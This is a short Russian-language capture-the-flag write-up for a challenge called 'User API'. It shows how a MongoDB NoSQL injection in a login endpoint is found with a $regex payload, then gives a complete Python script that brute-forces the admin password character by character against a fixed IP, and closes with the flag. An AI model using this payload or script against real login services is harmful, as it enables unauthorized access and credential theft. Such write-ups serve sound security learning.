# User API
Сервер принимает POST запросы с JSON объектом по пути /login . Если отправить JSON с правильным параметром и пустым объектом в значении то вернется ошибка "CastError". Если параметр не существует вернется строка "Wrong". 

Таким образом узнаем что запрос должен содержать два параметра "username" и "password".

Предположим что существует пользователь "admin" и попробуем перебрать его пароль:
```JSON
{"username":"admin","password": {"$regex": "^d" }}
```
В значение пароля передаем объект с регулярным выражением. Если начало пароля совпадает с переданной строкой сервер вернет "Succes".
Значит имеем NoSQL инъекцию в MongoDB.

С помощью скрипта автоматизируем подбор пароля:
```python
from requests import post
import urllib3
import string
urllib3.disable_warnings()

username='admin'
password=''
URL='http://45.131.97.54:3000/login'
H={'content-type': 'application/json'}
finish = False

while not finish:
  for c in string.printable:
    if c not in ['*','+','.','?','|']:
      payload='{"username": "%s", "password": {"$regex": "^%s" }}' % (username, password + c)
      r = post(URL, data = payload, headers=H, verify = False, allow_redirects = False)
      if 'Success' in r.text:
        password += c
        print('\r[Password]: %s' % (password), end='', flush=True)
        break
else: print()
```

В результате узнаем что пароль содержит флаг

Флаг - deteact{6b78aa0e40fefcabea1cf8076cac7204}